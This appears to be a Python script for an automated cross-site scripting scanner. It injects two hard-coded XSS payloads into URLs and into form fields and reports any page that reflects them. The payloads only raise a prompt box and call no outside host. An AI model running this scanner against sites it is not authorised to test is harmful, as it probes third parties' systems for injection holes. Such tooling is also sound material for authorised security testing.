import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import sys
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import agents
import random


retry_strategy = Retry(
    total=3,
    status_forcelist=[429, 500, 502, 503, 504],
    method_whitelist="GET"
)
adapter = HTTPAdapter(max_retries=retry_strategy)
s = requests.Session()
s.mount("https://", adapter)
s.mount("http://", adapter)
s.headers.update({"User-Agent": random.choice(agents.agent)})


xss_vector = ["\"<ScRipt>prompt`1`</scripT>",
              "\"<img src=x onerror%3Dprompt`1`>"]


def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    try:
        soup = bs(requests.get(url, allow_redirects=False).content, "html.parser")
    except:
        pass
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    action = form.attrs.get("action").lower()
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, value):

    target_url = urljoin(url, form_details["action"])
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        # replace all text and search values with `value`
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None,
            # then add them to the data of form submission
            data[input_name] = input_value

    if form_details["method"] == "post":
        try:
            return requests.post(target_url, data=data, allow_redirects=False)
        except:
            pass
    else:
        # GET request
        try:
            return requests.get(target_url, params=data, allow_redirects=False)
        except:
            pass


def scan_xss(url):
    """
    Given a `url`, it prints all XSS vulnerable forms and 
    returns True if any is vulnerable, False otherwise
    """
    final_url = ""
    for js_script in xss_vector:
        new_url = url+js_script
        try:
            res = s.get(new_url, allow_redirects=False)
            if js_script.lower() in res.content.decode().lower():
                # print(f"[+] XSS Detected on {new_url}")
                is_vulnerable = True
                final_url = url+js_script
                return final_url
        except:
            pass
    # get all the forms from the URL
    forms = get_all_forms(url)
    # print(f"[+] Detected {len(forms)} forms on {url}.")

    # returning value
    is_vulnerable = False
    # iterate over all forms
    content = ""
    for form in forms:
        form_details = get_form_details(form)
        for js_script in xss_vector:
            try:
                content = submit_form(
                    form_details, url, js_script).content.decode('unicode_escape', 'strict')
            except:
                pass
            if js_script.lower() in content.lower():
                # print(f"[+] XSS Detected on {url}")
                # print(f"[*] Form details:")
                # pprint(form_details)
                is_vulnerable = True
                final_url = url+"?" + \
                    form_details['inputs'][0]['name']+"=" + \
                    form_details['inputs'][0]['value']
                break
                # won't break because we want to print other available vulnerable forms
    return final_url


def worker(urls):
    extensions = [".pdf", ".jpg", ".jpeg", ".gif", ".svg", ".woff",
                  ".png", ".css", ".eot", ".txt", ".ttf", ".js", ".axd", ".ico"]
    res = []
    for url in urls:
        check = True
        try:
            get = requests.get(url, allow_redirects=False)
        except:
            continue
        if get.status_code != 404:
            for ex in extensions:
                if ex in url:
                    check = False
            if check:
                tmp = scan_xss(url)
                if tmp != '':
                    res.append(tmp)
    res = res[:5]
    return res


if __name__ == "__main__":
    import sys
    url = sys.argv[1]
    print(scan_xss(url))
